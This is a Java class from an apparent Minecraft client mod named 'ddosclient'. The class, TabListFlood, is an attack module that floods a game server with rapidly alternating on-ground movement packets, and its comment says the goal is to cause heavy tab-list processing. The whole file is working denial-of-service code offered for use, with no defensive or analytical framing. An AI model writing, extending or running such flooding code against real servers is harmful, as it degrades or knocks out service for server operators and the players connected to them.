package com.ddosclient.attack.attacks;

import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;

public class TabListFlood extends BaseAttack {
    // Forces rapid player state updates which cause heavy tab-list processing
    private boolean onGround = true;

    @Override
    public void execute(MinecraftClient mc) {
        if (mc.getNetworkHandler() == null || mc.player == null) return;
        for (int i = 0; i < 10; i++) {
            onGround = !onGround;
            mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.OnGroundOnly(onGround));
        }
    }
}
